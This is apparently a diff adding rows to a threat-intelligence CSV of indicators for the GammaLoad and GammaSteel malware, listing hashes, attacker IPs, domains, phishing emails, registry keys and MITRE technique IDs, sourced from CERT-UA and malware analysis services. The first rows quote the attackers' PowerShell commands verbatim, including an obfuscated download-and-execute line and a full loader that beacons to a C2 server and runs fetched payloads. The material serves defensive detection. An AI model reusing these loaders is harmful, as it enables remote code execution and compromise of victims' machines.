+"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nol -nop echo ([system.text.encoding]::utf8.getstring((new-object net.webclient).UploadData('hXXp://159.203.11.73/get.php   POST'  0)))|iex,https://cert.gov.ua/article/1229152
+"GammaLoad, GammaSteel",2022,Host,cmd line,,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -nologo Invoke-Expression $env:Include,https://cert.gov.ua/article/1229152
+"GammaLoad, GammaSteel",2022,Host,cmd line,,"function Random(){ $rnd='d' +-join ((48..57) + (97..122) | Get-Random -Count $( Get-Random -Minimum 10 -Maximum 25) | % {[char]$_}); return $rnd; } function XorByte($key, $response) { [byte[]]$new_bytes = new-object byte[] $response.Length; for($i=0; $i -lt $response.count ; $i++){ $new_bytes[$i] = $response[$i] -bxor $key[$i % $key.Length]; } ; return $new_bytes; } function Get-IP() {$wc= New-Object net.webclient; $wc.Headers.Add(""""Content-Type"""",""""application/x-www-form-urlencoded""""); $response = $wc.UploadData(""""hXXps://www.portcheckers.com/dns-lookup"""", [System.Text.Encoding]::UTF8.GetBytes(""""ipaddress=nxkad.ru"""")); $ip = [System.Text.Encoding]::UTF8.GetString($response) |?{$_ -match """"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}""""}|%{$Matches[0]}; return $ip; }while($count -le 4){ try{ $ip=Get-IP; $url = """"hXXp://"""" + $ip + """"/time.php""""; $key = (Get-WmiObject Win32_LogicalDisk -Filter """"DeviceID='$env:SystemDrive'"""" | Select-Object VolumeSerialNumber).VolumeSerialNumber; [string]$vsn = [System.Convert]::ToUInt32($key,16); $WebClient= New-Object net.webclient;$namevalueCln = New-Object System.Collections.Specialized.NameValueCollection; $rnd=Random; $namevalueCln.Add($rnd,$env:computername+"""";""""+$vsn); $response = $WebClient.UploadValues($url,$namevalueCln); [string]$myUri = [System.Text.Encoding]::UTF8.GetString($response); if($myUri.Length -gt 0){ if($myUri.substring(0,4) -eq """"hXXp"""" ){ $respa1 = $WebClient.UploadValues($myUri,$namevalueCln); $new_bytes = XorByte $vsn $respa1; [string]$path = $env:TEMP + '\' + $(Get-Random)+ '.exe'; [io.file]::WriteAllBytes($path ,$new_bytes); Start-Sleep -s 20; if($path.Length -gt 0){ [System.Diagnostics.Process]::Start([string]$path); } }else{ Start-Sleep -s 5; $new_bytes = XorByte $key $response; $myUri = [System.Text.Encoding]::UTF8.GetString($new_bytes); start-job { $sc = New-Object -ComObject MSScriptControl.ScriptControl.1; $sc.Timeout = 999999; $sc.Language = 'VBScript'; $sc.AddCode($args[0])} -ArgumentList $myUri -runas32 | wait-job | receive-job; } } }catch{} Start-Sleep -s 250; }",https://cert.gov.ua/article/1229152
+"GammaLoad, GammaSteel",2022,Host,cmd line,,powershell -w hidden -c (iex echo (iex (new-object net.webclient).downloadstring('hXXp://motoristo.ru/get.php'))|powershell -),https://cert.gov.ua/article/1229152
+"GammaLoad, GammaSteel",2022,Host,cmd line,,powershell -w hidden -nol -nop -c (iex ([string]::join(''  ((101 99 104 111 32 40 105 101 120 32 40 110 101 119 45 111 98 106 101 99 116 32 110 101 116 46 119 101 98 99 108 105 101 110 116 41 46 100 111 119 110 108 111 97 100 115 116 114 105 110 103 40 39 104 116 116 112 58 47 47 109 111 116 111 114 105 115 116 111 46 114 117 47 103 101 116 46 112 104 112 39 41 41 124 112 111 119 101 114 115 104 101 108 108 32 45) |%{([char][int] $_)})))|iex),https://cert.gov.ua/article/1229152
+,,General,MITRE Technique,,T1566.001,https://attack.mitre.org/techniques/T1566/001/
+,,General,MITRE Technique,,T1199,https://attack.mitre.org/techniques/T1199/
+,,General,MITRE Technique,,T1218.011,https://attack.mitre.org/techniques/T1218/011/
+,,General,MITRE Technique,,T1106,https://attack.mitre.org/techniques/T1106/
+,2022,Network,IP address,,45.61.136.16:80,https://analyze.intezer.com/url/85e10d45-e593-4286-8776-35a5c16218a2
+,2022,Host,File,File hash SHA256,23d417cd0d3dc0517adb49b10ef11d53e173ae7b427dbb6a7ddf45180056c029,https://analyze.intezer.com/analyses/9dbd67c8-d038-4b61-98a4-7d35400dd20f
+,2022,Host,File,File hash SHA256,acb3a5726a47f90c16938fe2d5fe31398d8c02e6310ef13fec0484b8eee43fee,https://analyze.intezer.com/analyses/e0d19e09-ed8f-485a-92bb-e7e997eddc42
+,2022,Host,File,File hash SHA256,3df27b2dc57eb244aaa4556a6aa851dc3143108cf31ec9a6da0b70156d6c3e6c,https://analyze.intezer.com/analyses/8bae06ee-1b9a-45f7-8e3c-30c14a269ecf
+,2022,Host,File,File hash SHA256,8c22533207ec41f971f8985b7566be3ce5d73d0f50a96817d7f038aca3326d20,https://analyze.intezer.com/analyses/53c7e83a-c983-43ce-8614-f9945b2e3246
+,2022,Host,File,File hash SHA256,23f2bac355ae4537d01f857d1ef0985fccf7a0b1bdf455f7ba7f7de2aa885941,https://analyze.intezer.com/analyses/b0d80307-7d7a-48ec-a534-ea8417b88bbc
+,2022,Host,File,File hash SHA256,d89bcc6fc915da12b1fd9b390ae06cc144f8eebe4619c957f0f3718c262816d7,https://analyze.intezer.com/analyses/20ccb01b-0baf-41b2-9e80-8239b52a2628
+,2022,Host,File,File hash SHA256,6d77083d63adb5eea1009408c680869fd362227e411a15259ef93d7377f0505f,https://analyze.intezer.com/analyses/0e432714-d6af-46db-952b-e21d883ab755
+,2022,Host,File,File hash SHA256,1fb2628812d5439df2e6f6bf1d19b42d1f7ab3f19f43721beee076c061f13c38,https://analyze.intezer.com/analyses/5ab3540d-ee00-4f47-ad0c-ac65dd6fff24
+,2022,Host,File,File hash SHA256,2f688832035e8ea172c90c31114916f34f5d15943818d1096973c097ff0ee6ed,https://analyze.intezer.com/analyses/078acf98-4ce3-4725-a007-33f63af98da4
+,2022,Host,File,File hash SHA256,b2122db8208f53273a09ecb1a7ff75e0303557d1b7df47ac2f7662f8c489675f,https://analyze.intezer.com/analyses/98959707-2e45-4bb4-9e2f-671b42e8ae87
+,2022,Host,File,File hash SHA256,e27a5a63b4b5b54bcc92fd634af8ba080aafc52e24a6aa68911989e0339b0444,https://analyze.intezer.com/analyses/5a09467c-1264-4117-9e12-07d0033f8022
+,2022,Host,File,File hash SHA256,f3917bcae3fde2397eac93d809281936652c632eee11f9f2083f79c97382300b,https://analyze.intezer.com/analyses/ecf7d562-60b9-47e6-af8f-8c0481719917
+,2022,Host,File,File hash SHA256,aff520f254da3219f2a11df0120de065f664d07338a80015f22f40674eda31f7,https://analyze.intezer.com/analyses/c1561f5b-64a2-421d-8710-7d4406141210
+,2022,Host,File,File hash SHA256,e6028b254a9784cf24139706a83a1f58607a4500eb64247a2ec7df50009a4cc3,https://analyze.intezer.com/analyses/fcbfba01-a28d-4ae4-8509-7a6fa89f25e3
+,2022,Host,File,File hash SHA256,90cb5319d7b5bb899b1aa684172942f749755bb998de3a63b2bccb51449d1273,https://analyze.intezer.com/analyses/554fed21-5e9c-427e-99cb-c92346e95c1d
+,2019,Host,File,File hash SHA256,20a7f517e02928b1dc03c0366a2947c29e14b264faf96a9e65e93d43f0b9004a,https://analyze.intezer.com/analyses/59cb7a75-cb2e-4cd7-b4ad-4f640372b5e2
+,2022,Host,File,File hash SHA256,393475dc090afab9a9ddf04738787199813f3974a22c13cb26f43c781e7b632f,https://analyze.intezer.com/analyses/8774947a-883c-42cf-9c9b-0f141fc34bf5
+,2022,Host,File,File hash SHA256,dd13b58b0d132dbf64573f90ea75f3ac030c0138ac940bfd593c6e54a33434cf,https://analyze.intezer.com/analyses/adcf0f68-e825-4e27-91e2-102fa73dc8d5
+,2022,Host,File,File hash SHA256,56a2171a8633cbb03362a37f0c5f0b5cf7695f19d14eaf0b6d273145edaac29e,https://analyze.intezer.com/analyses/9f1d5a16-629a-4fa8-a474-d7f6c1781390
+,2022,Host,File,File hash SHA256,2e9bef653e6a92b5570f2736bec5ecf64ef0f4342fba6f21a3c1c0f97f33346d,https://analyze.intezer.com/analyses/aa1134ba-2bcb-4b14-87ed-e46259577085
+,2022,Host,File,File hash SHA256,ce46746ed0d17925e07dfec70b3df69d181f55d52eb884aa96c431f5f980ca0c,https://analyze.intezer.com/analyses/725fc9b9-ada5-4c16-bc0b-5e7fb3acaa58
+,2022,Network,Email,,military-prosecutor@post.cz,https://cert.gov.ua/article/39386
+,2022,Network,Email,,Info@military-ukraine.site,https://cert.gov.ua/article/39086
+,2022,Network,URL,,http://atlanticos.site/south.php,https://www.virustotal.com/gui/url/7bb46effe36c798b226b476384cb333936a859ecfb4ea0273c84c260f1bc3916?nocache=1
+,2022,Host,Registry,Registry Key,HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\S-1-5-21-3170026379-3177503207-93694414-1001S-1-5-21-3170026379-3177503207-93694414-1001\Index,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Network,IP address,,185.137.235.192,https://analyze.intezer.com/url/3c04ebae-734c-4c65-94ae-d7a1b8e0e11d
+,2022,Network,URL,,http://wxanalytics.ru/net.exe,https://www.virustotal.com/gui/url/c0c2149c535e87f731ee0a54bc98b2489541fb81c9113d7e9174335cb7070c25
+,2022,Network,Domain,,mortalin.ru,https://www.virustotal.com/gui/domain/mortalin.ru
+,2022,Network,IP address,,89.108.70.47,https://analyze.intezer.com/url/3404ce6d-9ee5-47e8-9c11-415b60984aa5
+,2022,Host,File,File hash SHA256,9e8c79822a4012e7d5fc9c3fe80196d6bbe3be23449069995319c818235eebc5,https://analyze.intezer.com/analyses/dd647343-722a-40c7-a1d6-cbf01e2fec74
+,2022,Host,File,File hash SHA256,92667723d5956259d562e1defb44cb086c13f765087622142196b57320837117,https://analyze.intezer.com/analyses/4a09d62c-ce46-45c6-8382-42b14744d62a
+,2022,Host,File,File hash SHA256,a2966cd84a931e6d5bac273e685fa35c637502d023abe45f8573fcb922a7fc5e,https://analyze.intezer.com/analyses/076c4ed4-eda2-4836-a902-6cbb9af7bbdf
+,2022,Host,File,File hash SHA256,aa00b8713ca0340c6526ea60ca3e6538126c61267ed5f6b4777a73fb5c1f4f16,https://analyze.intezer.com/analyses/aeeed579-623e-48f5-8c99-4c964d25a699
+,2022,Host,File,File hash SHA256,ab67653691be37c79d8189ae208eb1b37d560614ee4b46d08bd0e254b6eb5cc7,https://analyze.intezer.com/analyses/dd9b285e-ccb1-475f-a968-2e1ef4df788e
+,2022,Host,Registry,Registry Key,HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Word\Resiliency\DocumentRecovery\5F9E2D\5F9E2D,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,Registry,Registry Key,"HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Word\Resiliency\StartupItems\b""|",https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,Registry,Registry Key,HKEY_CURRENT_USER\Software\Microsoft\Office\14.0\Word\Resiliency\StartupItems\du},https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\LocalCacheFileEditManager\FSD-{7FA37C13-3C6D-414D-8FA8-6CEBFD292ED4}.FSD,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detectt
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\{A8220EFB-A945-4D33-91A4-688CBBCB2C38},https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\{F49DCDC7-E1F3-437B-93E9-1B3CE703E4AA},https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\~DF9FBD36895B8F94A8.TMP,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,File hash SHA256,bb58d2e94c3b6de1311018bedca8ae8751470d398d39ed0420b5c6bff436e4cb,https://analyze.intezer.com/analyses/72620ea1-a8a8-4a8a-887b-2333e204d3aa
+,2022,Host,File,File hash SHA256,be7d70fb705c74f2de86db2b34f3e7587e5b3ded2d02eaad48fcfee426379372,https://analyze.intezer.com/analyses/b272909d-ad65-4795-b62e-e2dabba22ff9
+,2022,Host,File,File hash SHA256,2d99e762a41abec05e97dd1260775bad361dfa4e8b4120b912ce9c236331dd3f,https://analyze.intezer.com/analyses/972898e2-5e6b-4635-8962-7687116020c9
+,2022,Host,File,File hash SHA256,295654e3284158bdb94b40d7fb98ede8f3eab72171e027360a654f9523ece566,https://analyze.intezer.com/analyses/7f0957e9-7dc3-4b25-b146-0e3b281828ba
+,2022,Host,File,File hash SHA256,2f35cce3c4ece454ac24a6764d00239b88baaf0db4056de24c9bb4c4bf27f8a9,https://analyze.intezer.com/analyses/a07a37cd-69c4-4a92-9d71-7cdba949e247
+,2022,Host,File,File hash SHA256,3bdc2d69d7e1625913cf7a9802396b693004ad84a43ee9e57230d22679b46839,https://analyze.intezer.com/analyses/9f5cf492-40f7-4304-8049-902fb13a5e14
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.Word\~WRS{3D98095C-AABD-4F97-987C-334985D13D37}.tmp,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detectt
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Windows\Temporary Internet Files\Content.Word\~WRS{B39F007B-CAA3-40DF-B3DC-2D79834C6CAD}.tmp,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Temp\~DF7E738A5C207CEB97.TMP,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
+,2022,Host,File,Parent folder,C:\Users\<USER>\AppData\Local\Microsoft\Office\14.0\OfficeFileCache\FSD-{68F30A9F-FC40-4F49-AF55-26FA6A63F22B}.FSD,https://analyze.intezer.com/families/f575e3c3-e7e9-444c-9b25-d9629e59654f?tab=detect
